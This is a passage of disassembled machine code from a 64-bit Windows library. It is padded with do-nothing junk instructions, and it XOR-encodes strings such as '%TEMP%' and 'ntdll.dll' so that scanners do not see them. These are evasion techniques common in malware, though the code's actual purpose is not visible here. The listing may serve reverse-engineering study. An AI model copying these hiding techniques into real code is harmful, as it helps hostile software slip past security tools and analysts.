   18000328e:	4d 89 d2             	mov    %r10,%r10
   180003291:	41 55                	push   %r13
   180003293:	90                   	nop
   180003294:	41 5d                	pop    %r13
   180003296:	90                   	nop
   180003297:	90                   	nop
   180003298:	4d 89 db             	mov    %r11,%r11
   18000329b:	c7 44 24 60 40 00 00 	movl   $0x40,0x60(%rsp)
   1800032a2:	00 
   1800032a3:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   1800032a8:	ff d7                	call   *%rdi
   1800032aa:	90                   	nop
   1800032ab:	48 81 c4 68 02 00 00 	add    $0x268,%rsp
   1800032b2:	5f                   	pop    %rdi
   1800032b3:	5e                   	pop    %rsi
   1800032b4:	c3                   	ret
   1800032b5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1800032bc:	00 00 00 00 
   1800032c0:	48 81 ec 38 02 00 00 	sub    $0x238,%rsp
   1800032c7:	b9 86 01 00 00       	mov    $0x186,%ecx
   1800032cc:	e8 ef ef ff ff       	call   0x1800022c0
   1800032d1:	ff 15 99 0f 02 00    	call   *0x20f99(%rip)        # 0x180024270
   1800032d7:	41 55                	push   %r13
   1800032d9:	48 87 f6             	xchg   %rsi,%rsi
   1800032dc:	48 87 e4             	xchg   %rsp,%rsp
   1800032df:	41 5d                	pop    %r13
   1800032e1:	48 87 d2             	xchg   %rdx,%rdx
   1800032e4:	c7 44 24 20 24 00 00 	movl   $0x24,0x20(%rsp)
   1800032eb:	00 
   1800032ec:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800032f0:	83 f0 74             	xor    $0x74,%eax
   1800032f3:	66 89 44 24 26       	mov    %ax,0x26(%rsp)
   1800032f8:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800032fc:	83 f0 65             	xor    $0x65,%eax
   1800032ff:	66 89 44 24 28       	mov    %ax,0x28(%rsp)
   180003304:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180003308:	83 f0 70             	xor    $0x70,%eax
   18000330b:	66 89 44 24 2a       	mov    %ax,0x2a(%rsp)
   180003310:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180003314:	83 f0 6c             	xor    $0x6c,%eax
   180003317:	66 89 44 24 2c       	mov    %ax,0x2c(%rsp)
   18000331c:	66 c7 44 24 2e 00 00 	movw   $0x0,0x2e(%rsp)
   180003323:	48 8d 4c 24 26       	lea    0x26(%rsp),%rcx
   180003328:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000332d:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003333:	ff 15 cf 0e 02 00    	call   *0x20ecf(%rip)        # 0x180024208
   180003339:	41 52                	push   %r10
   18000333b:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   18000333f:	41 5a                	pop    %r10
   180003341:	52                   	push   %rdx
   180003342:	48 89 c0             	mov    %rax,%rax
   180003345:	5a                   	pop    %rdx
   180003346:	e8 35 e0 ff ff       	call   0x180001380
   18000334b:	4d 87 c9             	xchg   %r9,%r9
   18000334e:	48 89 c0             	mov    %rax,%rax
   180003351:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180003355:	90                   	nop
   180003356:	4d 87 c0             	xchg   %r8,%r8
   180003359:	90                   	nop
   18000335a:	c7 44 24 30 8f 8a 1b 	movl   $0x1b8a8f,0x30(%rsp)
   180003361:	00 
   180003362:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003366:	48 8d 12             	lea    (%rdx),%rdx
   180003369:	41 54                	push   %r12
   18000336b:	41 5c                	pop    %r12
   18000336d:	ff 15 55 0f 02 00    	call   *0x20f55(%rip)        # 0x1800242c8
   180003373:	90                   	nop
   180003374:	48 81 c4 38 02 00 00 	add    $0x238,%rsp
   18000337b:	c3                   	ret
   18000337c:	0f 1f 40 00          	nopl   0x0(%rax)
   180003380:	56                   	push   %rsi
   180003381:	48 83 ec 30          	sub    $0x30,%rsp
   180003385:	b9 bb 02 00 00       	mov    $0x2bb,%ecx
   18000338a:	e8 c1 e7 ff ff       	call   0x180001b50
   18000338f:	4d 8d 3f             	lea    (%r15),%r15
   180003392:	90                   	nop
   180003393:	e8 a8 e5 ff ff       	call   0x180001940
   180003398:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   18000339d:	ff 15 ed 0e 02 00    	call   *0x20eed(%rip)        # 0x180024290
   1800033a3:	48 8d 15 18 d7 01 00 	lea    0x1d718(%rip),%rdx        # 0x180020ac2
   1800033aa:	4c 8d 4c 24 2e       	lea    0x2e(%rsp),%r9
   1800033af:	b9 01 00 00 00       	mov    $0x1,%ecx
   1800033b4:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1800033ba:	ff 15 d8 0e 02 00    	call   *0x20ed8(%rip)        # 0x180024298
   1800033c0:	4d 8d 00             	lea    (%r8),%r8
   1800033c3:	90                   	nop
   1800033c4:	48 8b 35 b5 0e 02 00 	mov    0x20eb5(%rip),%rsi        # 0x180024280
   1800033cb:	ff d6                	call   *%rsi
   1800033cd:	53                   	push   %rbx
   1800033ce:	4d 8d 3f             	lea    (%r15),%r15
   1800033d1:	4d 87 f6             	xchg   %r14,%r14
   1800033d4:	5b                   	pop    %rbx
   1800033d5:	ff d6                	call   *%rsi
   1800033d7:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800033db:	48 89 e4             	mov    %rsp,%rsp
   1800033de:	48 89 f6             	mov    %rsi,%rsi
   1800033e1:	48 87 ff             	xchg   %rdi,%rdi
   1800033e4:	e8 67 e9 ff ff       	call   0x180001d50
   1800033e9:	48 87 ff             	xchg   %rdi,%rdi
   1800033ec:	90                   	nop
   1800033ed:	48 89 c0             	mov    %rax,%rax
   1800033f0:	c7 44 24 28 46 87 15 	movl   $0x158746,0x28(%rsp)
   1800033f7:	00 
   1800033f8:	8b 44 24 28          	mov    0x28(%rsp),%eax
   1800033fc:	4d 89 e4             	mov    %r12,%r12
   1800033ff:	57                   	push   %rdi
   180003400:	48 89 ff             	mov    %rdi,%rdi
   180003403:	5f                   	pop    %rdi
   180003404:	4d 89 d2             	mov    %r10,%r10
   180003407:	90                   	nop
   180003408:	e8 f3 e3 ff ff       	call   0x180001800
   18000340d:	b9 fb 00 00 00       	mov    $0xfb,%ecx
   180003412:	e8 29 e6 ff ff       	call   0x180001a40
   180003417:	55                   	push   %rbp
   180003418:	5d                   	pop    %rbp
   180003419:	ff 15 09 0e 02 00    	call   *0x20e09(%rip)        # 0x180024228
   18000341f:	89 c1                	mov    %eax,%ecx
   180003421:	ff 15 a1 0f 02 00    	call   *0x20fa1(%rip)        # 0x1800243c8
   180003427:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   18000342b:	48 8d 36             	lea    (%rsi),%rsi
   18000342e:	e8 1d e9 ff ff       	call   0x180001d50
   180003433:	ff 15 67 0d 02 00    	call   *0x20d67(%rip)        # 0x1800241a0
   180003439:	90                   	nop
   18000343a:	4d 87 ed             	xchg   %r13,%r13
   18000343d:	e8 7e df ff ff       	call   0x1800013c0
   180003442:	c7 44 24 24 39 7d 2b 	movl   $0x2b7d39,0x24(%rsp)
   180003449:	00 
   18000344a:	8b 44 24 24          	mov    0x24(%rsp),%eax
   18000344e:	90                   	nop
   18000344f:	48 87 db             	xchg   %rbx,%rbx
   180003452:	90                   	nop
   180003453:	4d 89 c9             	mov    %r9,%r9
   180003456:	90                   	nop
   180003457:	e8 e4 e4 ff ff       	call   0x180001940
   18000345c:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180003460:	4d 8d 09             	lea    (%r9),%r9
   180003463:	48 8d 36             	lea    (%rsi),%rsi
   180003466:	4d 87 d2             	xchg   %r10,%r10
   180003469:	4d 87 c0             	xchg   %r8,%r8
   18000346c:	4d 8d 3f             	lea    (%r15),%r15
   18000346f:	90                   	nop
   180003470:	ff 15 6a 0d 02 00    	call   *0x20d6a(%rip)        # 0x1800241e0
   180003476:	90                   	nop
   180003477:	48 83 c4 30          	add    $0x30,%rsp
   18000347b:	5e                   	pop    %rsi
   18000347c:	c3                   	ret
   18000347d:	0f 1f 00             	nopl   (%rax)
   180003480:	56                   	push   %rsi
   180003481:	48 83 ec 50          	sub    $0x50,%rsp
   180003485:	b9 4a 01 00 00       	mov    $0x14a,%ecx
   18000348a:	e8 51 e4 ff ff       	call   0x1800018e0
   18000348f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180003494:	ff 15 ee 0e 02 00    	call   *0x20eee(%rip)        # 0x180024388
   18000349a:	4d 89 ed             	mov    %r13,%r13
   18000349d:	48 89 ff             	mov    %rdi,%rdi
   1800034a0:	4d 87 c0             	xchg   %r8,%r8
   1800034a3:	41 51                	push   %r9
   1800034a5:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800034a9:	41 59                	pop    %r9
   1800034ab:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800034b0:	ff 15 b2 0d 02 00    	call   *0x20db2(%rip)        # 0x180024268
   1800034b6:	48 89 ed             	mov    %rbp,%rbp
   1800034b9:	b9 06 00 00 00       	mov    $0x6,%ecx
   1800034be:	ff 15 74 0e 02 00    	call   *0x20e74(%rip)        # 0x180024338
   1800034c4:	4d 8d 3f             	lea    (%r15),%r15
   1800034c7:	48 8d 0d e6 d5 01 00 	lea    0x1d5e6(%rip),%rcx        # 0x180020ab4
   1800034ce:	ff 15 a4 0e 02 00    	call   *0x20ea4(%rip)        # 0x180024378
   1800034d4:	90                   	nop
   1800034d5:	4d 89 ed             	mov    %r13,%r13
   1800034d8:	90                   	nop
   1800034d9:	c7 44 24 20 70 9b 88 	movl   $0x889b70,0x20(%rsp)
   1800034e0:	00 
   1800034e1:	8b 44 24 20          	mov    0x20(%rsp),%eax
   1800034e5:	4d 89 ff             	mov    %r15,%r15
   1800034e8:	4d 89 e4             	mov    %r12,%r12
   1800034eb:	90                   	nop
   1800034ec:	4d 8d 3f             	lea    (%r15),%r15
   1800034ef:	48 89 ed             	mov    %rbp,%rbp
   1800034f2:	90                   	nop
   1800034f3:	90                   	nop
   1800034f4:	4d 89 e4             	mov    %r12,%r12
   1800034f7:	90                   	nop
   1800034f8:	e8 93 e9 ff ff       	call   0x180001e90
   1800034fd:	4d 8d 00             	lea    (%r8),%r8
   180003500:	48 87 f6             	xchg   %rsi,%rsi
   180003503:	48 89 c0             	mov    %rax,%rax
   180003506:	b9 6b 01 00 00       	mov    $0x16b,%ecx
   18000350b:	e8 20 de ff ff       	call   0x180001330
   180003510:	ff 15 b2 0c 02 00    	call   *0x20cb2(%rip)        # 0x1800241c8
   180003516:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000351b:	ff 15 0f 0d 02 00    	call   *0x20d0f(%rip)        # 0x180024230
   180003521:	90                   	nop
   180003522:	4d 89 c9             	mov    %r9,%r9
   180003525:	90                   	nop
   180003526:	e8 15 e4 ff ff       	call   0x180001940
   18000352b:	50                   	push   %rax
   18000352c:	90                   	nop
   18000352d:	58                   	pop    %rax
   18000352e:	c7 44 24 20 79 ae 8a 	movl   $0x8aae79,0x20(%rsp)
   180003535:	00 
   180003536:	8b 44 24 20          	mov    0x20(%rsp),%eax
   18000353a:	4d 8d 12             	lea    (%r10),%r10
   18000353d:	4d 8d 09             	lea    (%r9),%r9
   180003540:	48 87 ed             	xchg   %rbp,%rbp
   180003543:	90                   	nop
   180003544:	52                   	push   %rdx
   180003545:	56                   	push   %rsi
   180003546:	5e                   	pop    %rsi
   180003547:	5a                   	pop    %rdx
   180003548:	b9 d7 01 00 00       	mov    $0x1d7,%ecx
   18000354d:	e8 1e eb ff ff       	call   0x180002070
   180003552:	e8 a9 e2 ff ff       	call   0x180001800
   180003557:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000355c:	ff 15 1e 0e 02 00    	call   *0x20e1e(%rip)        # 0x180024380
   180003562:	ff 15 60 0d 02 00    	call   *0x20d60(%rip)        # 0x1800242c8
   180003568:	89 c6                	mov    %eax,%esi
   18000356a:	ff 15 70 0c 02 00    	call   *0x20c70(%rip)        # 0x1800241e0
   180003570:	0f af c6             	imul   %esi,%eax
   180003573:	89 44 24 20          	mov    %eax,0x20(%rsp)
   180003577:	8b 44 24 20          	mov    0x20(%rsp),%eax
   18000357b:	c7 44 24 20 45 fc 36 	movl   $0x36fc45,0x20(%rsp)
   180003582:	00 
   180003583:	8b 44 24 20          	mov    0x20(%rsp),%eax
   180003587:	48 89 e4             	mov    %rsp,%rsp
   18000358a:	90                   	nop
   18000358b:	4d 89 d2             	mov    %r10,%r10
   18000358e:	4d 8d 00             	lea    (%r8),%r8
   180003591:	4d 89 ff             	mov    %r15,%r15
   180003594:	90                   	nop
   180003595:	48 87 e4             	xchg   %rsp,%rsp
   180003598:	90                   	nop
   180003599:	48 8d 12             	lea    (%rdx),%rdx
   18000359c:	48 89 ff             	mov    %rdi,%rdi
   18000359f:	90                   	nop
   1800035a0:	48 89 f6             	mov    %rsi,%rsi
   1800035a3:	90                   	nop
   1800035a4:	4d 87 ff             	xchg   %r15,%r15
   1800035a7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800035ac:	ff 15 f6 0c 02 00    	call   *0x20cf6(%rip)        # 0x1800242a8
   1800035b2:	8b 44 24 24          	mov    0x24(%rsp),%eax
   1800035b6:	48 83 c4 50          	add    $0x50,%rsp
   1800035ba:	5e                   	pop    %rsi
   1800035bb:	c3                   	ret
   1800035bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1800035c0:	48 81 ec 58 02 00 00 	sub    $0x258,%rsp
   1800035c7:	c7 44 24 4c 34 00 00 	movl   $0x34,0x4c(%rsp)
   1800035ce:	00 
   1800035cf:	90                   	nop
   1800035d0:	48 87 db             	xchg   %rbx,%rbx
   1800035d3:	48 89 f6             	mov    %rsi,%rsi
   1800035d6:	48 87 db             	xchg   %rbx,%rbx
   1800035d9:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   1800035dd:	41 53                	push   %r11
   1800035df:	4d 87 ff             	xchg   %r15,%r15
   1800035e2:	48 89 c0             	mov    %rax,%rax
   1800035e5:	41 5b                	pop    %r11
   1800035e7:	b9 20 01 00 00       	mov    $0x120,%ecx
   1800035ec:	e8 0f e7 ff ff       	call   0x180001d00
   1800035f1:	56                   	push   %rsi
   1800035f2:	5e                   	pop    %rsi
   1800035f3:	ff 15 e7 0b 02 00    	call   *0x20be7(%rip)        # 0x1800241e0
   1800035f9:	41 55                	push   %r13
   1800035fb:	41 54                	push   %r12
   1800035fd:	41 5c                	pop    %r12
   1800035ff:	41 5d                	pop    %r13
   180003601:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   180003606:	b9 00 04 00 00       	mov    $0x400,%ecx
   18000360b:	ba 5c 00 00 00       	mov    $0x5c,%edx
   180003610:	41 b9 55 00 00 00    	mov    $0x55,%r9d
   180003616:	ff 15 1c 0c 02 00    	call   *0x20c1c(%rip)        # 0x180024238
   18000361c:	41 53                	push   %r11
   18000361e:	41 5b                	pop    %r11
   180003620:	c7 44 24 38 14 00 00 	movl   $0x14,0x38(%rsp)
   180003627:	00 
   180003628:	8b 44 24 38          	mov    0x38(%rsp),%eax
   18000362c:	83 f0 31             	xor    $0x31,%eax
   18000362f:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   180003634:	8b 44 24 38          	mov    0x38(%rsp),%eax
   180003638:	83 f0 40             	xor    $0x40,%eax
   18000363b:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180003640:	8b 44 24 38          	mov    0x38(%rsp),%eax
   180003644:	83 f0 51             	xor    $0x51,%eax
   180003647:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   18000364c:	8b 44 24 38          	mov    0x38(%rsp),%eax
   180003650:	83 f0 59             	xor    $0x59,%eax
   180003653:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   180003658:	8b 44 24 38          	mov    0x38(%rsp),%eax
   18000365c:	83 f0 44             	xor    $0x44,%eax
   18000365f:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   180003664:	8b 44 24 38          	mov    0x38(%rsp),%eax
   180003668:	83 f0 31             	xor    $0x31,%eax
   18000366b:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   180003670:	66 c7 44 24 4a 00 00 	movw   $0x0,0x4a(%rsp)
   180003677:	48 8d 4c 24 3e       	lea    0x3e(%rsp),%rcx
   18000367c:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003681:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003687:	ff 15 bb 0a 02 00    	call   *0x20abb(%rip)        # 0x180024148
   18000368d:	4d 8d 3f             	lea    (%r15),%r15
   180003690:	48 89 ed             	mov    %rbp,%rbp
   180003693:	4d 8d 36             	lea    (%r14),%r14
   180003696:	57                   	push   %rdi
   180003697:	4d 8d 24 24          	lea    (%r12),%r12
   18000369b:	48 87 ff             	xchg   %rdi,%rdi
   18000369e:	5f                   	pop    %rdi
   18000369f:	48 89 ed             	mov    %rbp,%rbp
   1800036a2:	48 8d 05 11 d4 01 00 	lea    0x1d411(%rip),%rax        # 0x180020aba
   1800036a9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800036ae:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1800036b5:	00 
   1800036b6:	4c 8d 05 01 d4 01 00 	lea    0x1d401(%rip),%r8        # 0x180020abe
   1800036bd:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   1800036c2:	31 d2                	xor    %edx,%edx
   1800036c4:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800036ca:	ff 15 40 0a 02 00    	call   *0x20a40(%rip)        # 0x180024110
   1800036d0:	4d 8d 00             	lea    (%r8),%r8
   1800036d3:	4d 87 d2             	xchg   %r10,%r10
   1800036d6:	90                   	nop
   1800036d7:	90                   	nop
   1800036d8:	4d 8d 3f             	lea    (%r15),%r15
   1800036db:	41 51                	push   %r9
   1800036dd:	41 55                	push   %r13
   1800036df:	41 5d                	pop    %r13
   1800036e1:	41 59                	pop    %r9
   1800036e3:	e8 e8 e7 ff ff       	call   0x180001ed0
   1800036e8:	c7 44 24 50 e3 59 cb 	movl   $0xcb59e3,0x50(%rsp)
   1800036ef:	00 
   1800036f0:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800036f4:	48 8d 3f             	lea    (%rdi),%rdi
   1800036f7:	4d 89 e4             	mov    %r12,%r12
   1800036fa:	4d 89 d2             	mov    %r10,%r10
   1800036fd:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180003701:	4d 8d 3f             	lea    (%r15),%r15
   180003704:	53                   	push   %rbx
   180003705:	48 89 db             	mov    %rbx,%rbx
   180003708:	5b                   	pop    %rbx
   180003709:	4d 8d 12             	lea    (%r10),%r10
   18000370c:	48 8d 00             	lea    (%rax),%rax
   18000370f:	41 50                	push   %r8
   180003711:	41 58                	pop    %r8
   180003713:	b8 01 00 00 00       	mov    $0x1,%eax
   180003718:	48 81 c4 58 02 00 00 	add    $0x258,%rsp
   18000371f:	c3                   	ret
   180003720:	56                   	push   %rsi
   180003721:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   180003728:	b9 42 02 00 00       	mov    $0x242,%ecx
   18000372d:	e8 1e e9 ff ff       	call   0x180002050
   180003732:	4d 87 e4             	xchg   %r12,%r12
   180003735:	48 8d 1b             	lea    (%rbx),%rbx
   180003738:	4d 89 c9             	mov    %r9,%r9
   18000373b:	4d 89 ed             	mov    %r13,%r13
   18000373e:	e8 bd e0 ff ff       	call   0x180001800
   180003743:	48 8d 0d 54 d3 01 00 	lea    0x1d354(%rip),%rcx        # 0x180020a9e
   18000374a:	ff 15 00 0b 02 00    	call   *0x20b00(%rip)        # 0x180024250
   180003750:	57                   	push   %rdi
   180003751:	90                   	nop
   180003752:	5f                   	pop    %rdi
   180003753:	ff 15 97 0a 02 00    	call   *0x20a97(%rip)        # 0x1800241f0
   180003759:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18000375e:	ff 15 d4 0b 02 00    	call   *0x20bd4(%rip)        # 0x180024338
   180003764:	4d 89 db             	mov    %r11,%r11
   180003767:	41 54                	push   %r12
   180003769:	90                   	nop
   18000376a:	41 5c                	pop    %r12
   18000376c:	ff 15 56 0b 02 00    	call   *0x20b56(%rip)        # 0x1800242c8
   180003772:	4d 8d 36             	lea    (%r14),%r14
   180003775:	48 87 db             	xchg   %rbx,%rbx
   180003778:	4d 87 d2             	xchg   %r10,%r10
   18000377b:	e8 10 e7 ff ff       	call   0x180001e90
   180003780:	c7 44 24 30 29 bb 89 	movl   $0x89bb29,0x30(%rsp)
   180003787:	00 
   180003788:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000378c:	48 87 ff             	xchg   %rdi,%rdi
   18000378f:	4d 8d 24 24          	lea    (%r12),%r12
   180003793:	48 89 d2             	mov    %rdx,%rdx
   180003796:	48 87 db             	xchg   %rbx,%rbx
   180003799:	e8 e2 db ff ff       	call   0x180001380
   18000379e:	48 89 d2             	mov    %rdx,%rdx
   1800037a1:	b9 fe 02 00 00       	mov    $0x2fe,%ecx
   1800037a6:	e8 35 e0 ff ff       	call   0x1800017e0
   1800037ab:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1800037b0:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800037b5:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1800037bc:	00 
   1800037bd:	4c 8d 05 fe d2 01 00 	lea    0x1d2fe(%rip),%r8        # 0x180020ac2
   1800037c4:	b9 00 04 00 00       	mov    $0x400,%ecx
   1800037c9:	ba 00 01 00 00       	mov    $0x100,%edx
   1800037ce:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1800037d4:	ff 15 76 0b 02 00    	call   *0x20b76(%rip)        # 0x180024350
   1800037da:	4d 89 c9             	mov    %r9,%r9
   1800037dd:	4d 8d 24 24          	lea    (%r12),%r12
   1800037e1:	41 50                	push   %r8
   1800037e3:	48 87 d2             	xchg   %rdx,%rdx
   1800037e6:	41 58                	pop    %r8
   1800037e8:	e8 13 e0 ff ff       	call   0x180001800
   1800037ed:	48 8d 74 24 30       	lea    0x30(%rsp),%rsi
   1800037f2:	31 c9                	xor    %ecx,%ecx
   1800037f4:	31 d2                	xor    %edx,%edx
   1800037f6:	49 89 f0             	mov    %rsi,%r8
   1800037f9:	ff 15 59 0a 02 00    	call   *0x20a59(%rip)        # 0x180024258
   1800037ff:	4d 8d 36             	lea    (%r14),%r14
   180003802:	48 89 c9             	mov    %rcx,%rcx
   180003805:	c7 44 24 30 6f aa d0 	movl   $0xd0aa6f,0x30(%rsp)
   18000380c:	00 
   18000380d:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180003811:	41 52                	push   %r10
   180003813:	4d 87 db             	xchg   %r11,%r11
   180003816:	41 5a                	pop    %r10
   180003818:	53                   	push   %rbx
   180003819:	48 89 ff             	mov    %rdi,%rdi
   18000381c:	4d 87 db             	xchg   %r11,%r11
   18000381f:	5b                   	pop    %rbx
   180003820:	4d 89 e4             	mov    %r12,%r12
   180003823:	4d 89 c0             	mov    %r8,%r8
   180003826:	41 56                	push   %r14
   180003828:	4d 87 ff             	xchg   %r15,%r15
   18000382b:	48 8d 12             	lea    (%rdx),%rdx
   18000382e:	41 5e                	pop    %r14
   180003830:	e8 4b db ff ff       	call   0x180001380
   180003835:	b9 67 01 00 00       	mov    $0x167,%ecx
   18000383a:	e8 d1 ea ff ff       	call   0x180002310
   18000383f:	55                   	push   %rbp
   180003840:	48 89 e4             	mov    %rsp,%rsp
   180003843:	5d                   	pop    %rbp
   180003844:	ff 15 96 0a 02 00    	call   *0x20a96(%rip)        # 0x1800242e0
   18000384a:	41 52                	push   %r10
   18000384c:	48 89 f6             	mov    %rsi,%rsi
   18000384f:	41 5a                	pop    %r10
   180003851:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003856:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   18000385d:	00 
   18000385e:	4c 8d 05 37 d2 01 00 	lea    0x1d237(%rip),%r8        # 0x180020a9c
   180003865:	31 c9                	xor    %ecx,%ecx
   180003867:	31 d2                	xor    %edx,%edx
   180003869:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000386f:	ff 15 fb 0a 02 00    	call   *0x20afb(%rip)        # 0x180024370
   180003875:	48 8d 1b             	lea    (%rbx),%rbx
   180003878:	90                   	nop
   180003879:	90                   	nop
   18000387a:	4d 87 d2             	xchg   %r10,%r10
   18000387d:	48 8d 1b             	lea    (%rbx),%rbx
   180003880:	4d 87 e4             	xchg   %r12,%r12
   180003883:	48 89 d2             	mov    %rdx,%rdx
   180003886:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000388b:	31 c9                	xor    %ecx,%ecx
   18000388d:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   180003893:	ff 15 af 09 02 00    	call   *0x209af(%rip)        # 0x180024248
   180003899:	41 50                	push   %r8
   18000389b:	41 53                	push   %r11
   18000389d:	41 5b                	pop    %r11
   18000389f:	41 58                	pop    %r8
   1800038a1:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   1800038a5:	90                   	nop
   1800038a6:	90                   	nop
   1800038a7:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1800038ac:	b9 04 01 00 00       	mov    $0x104,%ecx
   1800038b1:	ff 15 01 0a 02 00    	call   *0x20a01(%rip)        # 0x1800242b8
   1800038b7:	4d 8d 1b             	lea    (%r11),%r11
   1800038ba:	48 87 f6             	xchg   %rsi,%rsi
   1800038bd:	48 89 ff             	mov    %rdi,%rdi
   1800038c0:	c7 44 24 30 19 62 43 	movl   $0x436219,0x30(%rsp)
   1800038c7:	00 
   1800038c8:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1800038cc:	4d 89 d2             	mov    %r10,%r10
   1800038cf:	90                   	nop
   1800038d0:	90                   	nop
   1800038d1:	90                   	nop
   1800038d2:	90                   	nop
   1800038d3:	90                   	nop
   1800038d4:	90                   	nop
   1800038d5:	90                   	nop
   1800038d6:	90                   	nop
   1800038d7:	90                   	nop
   1800038d8:	90                   	nop
   1800038d9:	4d 8d 09             	lea    (%r9),%r9
   1800038dc:	90                   	nop
   1800038dd:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800038e2:	ff 15 80 09 02 00    	call   *0x20980(%rip)        # 0x180024268
   1800038e8:	8b 44 24 50          	mov    0x50(%rsp),%eax
   1800038ec:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   1800038f3:	5e                   	pop    %rsi
   1800038f4:	c3                   	ret
   1800038f5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1800038fc:	00 00 00 00 
   180003900:	48 83 ec 48          	sub    $0x48,%rsp
   180003904:	b9 0c 03 00 00       	mov    $0x30c,%ecx
   180003909:	e8 c2 db ff ff       	call   0x1800014d0
   18000390e:	41 52                	push   %r10
   180003910:	4d 8d 24 24          	lea    (%r12),%r12
   180003914:	48 89 e4             	mov    %rsp,%rsp
   180003917:	41 5a                	pop    %r10
   180003919:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   18000391e:	ff 15 1c 0a 02 00    	call   *0x20a1c(%rip)        # 0x180024340
   180003924:	c7 44 24 2c a7 00 00 	movl   $0xa7,0x2c(%rsp)
   18000392b:	00 
   18000392c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003930:	35 c9 00 00 00       	xor    $0xc9,%eax
   180003935:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   18000393a:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000393e:	35 d3 00 00 00       	xor    $0xd3,%eax
   180003943:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180003948:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000394c:	35 c3 00 00 00       	xor    $0xc3,%eax
   180003951:	66 89 44 24 34       	mov    %ax,0x34(%rsp)
   180003956:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   18000395a:	35 cb 00 00 00       	xor    $0xcb,%eax
   18000395f:	66 89 44 24 36       	mov    %ax,0x36(%rsp)
   180003964:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003968:	35 cb 00 00 00       	xor    $0xcb,%eax
   18000396d:	66 89 44 24 38       	mov    %ax,0x38(%rsp)
   180003972:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003976:	35 89 00 00 00       	xor    $0x89,%eax
   18000397b:	66 89 44 24 3a       	mov    %ax,0x3a(%rsp)
   180003980:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003984:	35 c3 00 00 00       	xor    $0xc3,%eax
   180003989:	66 89 44 24 3c       	mov    %ax,0x3c(%rsp)
   18000398e:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180003992:	35 cb 00 00 00       	xor    $0xcb,%eax
   180003997:	66 89 44 24 3e       	mov    %ax,0x3e(%rsp)
   18000399c:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   1800039a0:	35 cb 00 00 00       	xor    $0xcb,%eax
   1800039a5:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   1800039aa:	66 c7 44 24 42 00 00 	movw   $0x0,0x42(%rsp)
   1800039b1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1800039b6:	ff 15 a4 08 02 00    	call   *0x208a4(%rip)        # 0x180024260
   1800039bc:	41 53                	push   %r11
   1800039be:	48 8d 00             	lea    (%rax),%rax
   1800039c1:	48 8d 36             	lea    (%rsi),%rsi
   1800039c4:	41 5b                	pop    %r11
   1800039c6:	e8 c5 e4 ff ff       	call   0x180001e90
   1800039cb:	41 50                	push   %r8
